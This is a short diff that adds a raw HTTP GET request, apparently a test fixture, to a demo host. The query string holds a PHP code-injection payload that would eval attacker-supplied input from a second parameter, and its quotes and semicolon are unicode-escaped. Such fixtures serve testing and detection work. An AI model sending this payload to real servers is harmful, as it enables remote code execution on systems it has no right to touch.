@@ -1,0 +1,4 @@
+GET /a?s=@eval($_GET[\u0027x\u0027])\u003B HTTP/1.1
+Host: demo.example.com
+Connection: close
+
